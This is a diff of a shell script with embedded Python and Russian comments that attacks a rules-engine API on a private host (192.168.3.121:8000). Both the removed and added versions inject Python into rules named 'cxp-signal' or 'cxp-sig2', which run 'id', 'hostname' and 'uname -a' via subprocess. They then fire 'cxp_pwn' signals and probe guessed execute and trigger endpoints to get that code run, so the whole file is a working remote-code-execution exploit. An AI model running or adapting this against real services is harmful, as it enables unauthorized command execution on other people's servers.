@@ -1,38 +1,58 @@
-echo "=== CREATE SIGNAL RULE (правильная структура) ==="
-python3 << 'SR'
+echo "=== UPDATE RULE 4 с кодом + FIRE ==="
+python3 << 'UP'
 import urllib.request,json
 B="http://192.168.3.121:8000"
-# Сначала: GET существующие rules (полный ответ)
-r=urllib.request.urlopen(B+"/api/v1/rules",timeout=8)
-data=json.loads(r.read())
-print("CURRENT RULES:",json.dumps(data,indent=1)[:800])
-# Создаём правило с signal_name триггером
-for rule in [
-    # вариант 1: signal_name в триггере
-    {"name":"cxp-signal","trigger":{"signal_name":"cxp_pwn","type":"signal"},
-     "code":"import subprocess as sp; result=sp.run(['id'],capture_output=True,text=True).stdout",
-     "codeType":"python"},
-    # вариант 2: простой signal_name
-    {"name":"cxp-sig2","signal_name":"cxp_pwn2",
-     "code":"import os; result=os.popen('id').read()",
-     "codeType":"python"},
-]:
-    req=urllib.request.Request(B+"/api/v1/rules",data=json.dumps(rule).encode(),
-        headers={"Content-Type":"application/json"})
-    try:
-        r=urllib.request.urlopen(req,timeout=8)
-        print(f"CREATE {rule['name']}: {r.status} {r.read()[:300]}")
-    except urllib.error.HTTPError as e:
-        print(f"CREATE {rule['name']}: {e.code} {e.read()[:200]}")
-# Теперь fire с signal_name
-for sig in [{"signal_name":"cxp_pwn"},{"signal_name":"cxp_pwn2"}]:
+# Обновляем правило 4: добавляем executionParams с Python кодом
+update={
+  "name":"cxp-signal",
+  "codeType":"python",
+  "conditionCode":"result = True",
+  "conditionType":"code",
+  "trigger":{"signalName":"cxp_pwn","type":"signal"},
+  "executionType":"code",
+  "executionParams":{
+    "code":"import subprocess as sp\nresult = sp.run(['id','hostname','uname','-a'],capture_output=True,text=True)\noutput = result.stdout"
+  }
+}
+req=urllib.request.Request(B+"/api/v1/rules/4",data=json.dumps(update).encode(),
+    headers={"Content-Type":"application/json"},method="PUT")
+try:
+    r=urllib.request.urlopen(req,timeout=10)
+    print(f"UPDATE: {r.status} {r.read()[:300]}")
+except urllib.error.HTTPError as e:
+    print(f"UPDATE: {e.code} {e.read()[:300]}")
+
+# Пробуем fire
+for sig in [{"signal_name":"cxp_pwn"},{"signalName":"cxp_pwn"}]:
     req=urllib.request.Request(B+"/api/v1/rules/signals/fire",
         data=json.dumps(sig).encode(),
         headers={"Content-Type":"application/json"})
     try:
-        r=urllib.request.urlopen(req,timeout=10)
-        print(f"FIRE {sig['signal_name']}: {r.status} {r.read()[:500]}")
+        r=urllib.request.urlopen(req,timeout=15)
+        print(f"FIRE: {r.status} {r.read()[:500]}")
     except urllib.error.HTTPError as e:
-        print(f"FIRE {sig['signal_name']}: {e.code} {e.read()[:300]}")
-SR
-echo SIGNAL-RULE
+        print(f"FIRE: {e.code} {e.read()[:300]}")
+
+# Пробуем создать execution напрямую
+exec_payload={"rule_id":4,"context":{"test":True}}
+req=urllib.request.Request(B+"/api/v1/executions",data=json.dumps(exec_payload).encode(),
+    headers={"Content-Type":"application/json"})
+try:
+    r=urllib.request.urlopen(req,timeout=10)
+    print(f"EXEC-CREATE: {r.status} {r.read()[:300]}")
+except urllib.error.HTTPError as e:
+    print(f"EXEC-CREATE: {e.code} {e.read()[:200]}")
+
+# Пробуем manual trigger endpoint
+for ep in ["/api/v1/rules/1/fire","/api/v1/rules/4/fire","/api/v1/rules/4/execute","/api/v1/rules/4/trigger","/api/v1/rules/4/toggle"]:
+    req=urllib.request.Request(B+ep,data=b"{}",headers={"Content-Type":"application/json"})
+    try:
+        r=urllib.request.urlopen(req,timeout=8)
+        print(f"RULE-ENDPOINT {ep}: {r.status} {r.read()[:300]}")
+    except urllib.error.HTTPError as e:
+        if e.code != 404 and e.code != 405:
+            print(f"RULE-ENDPOINT {ep}: {e.code} {e.read()[:200]}")
+    except Exception as e:
+        pass
+UP
+echo RULE-EXEC
